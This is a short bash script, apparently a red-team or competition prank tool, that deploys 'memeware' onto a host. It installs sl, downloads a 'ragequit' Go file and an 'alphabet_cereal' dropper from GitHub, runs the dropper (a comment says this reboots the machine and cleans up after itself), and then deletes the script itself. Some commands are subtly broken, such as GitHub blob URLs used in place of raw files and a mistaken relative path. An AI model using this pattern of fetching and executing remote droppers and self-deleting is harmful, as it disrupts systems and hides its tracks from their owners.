#!/bin/bash

# this script is for deploying some memeware like sl, ragequit, and alphabet_cereal

# install sl 
apt-get install sl
# if on centos use this:
# yum -y install sl

# install ragequit
wget -O /media/driver0/rq.go https://github.com/degenerat3/ragequit/blob/master/rq.go

# install alphabet_cereal
# assume that the alphabet_cereal installer is not on this device
wget -O /media/driver0/dropper.sh https://github.com/P0nt14c/alphabet_cereal/blob/master/dropper.sh
#execute the dropper. will cause the machine to reboot, but will also clean itself up
./media/driver0/dropper.sh 

#clean up this script
rm -f ../memedeploy.sh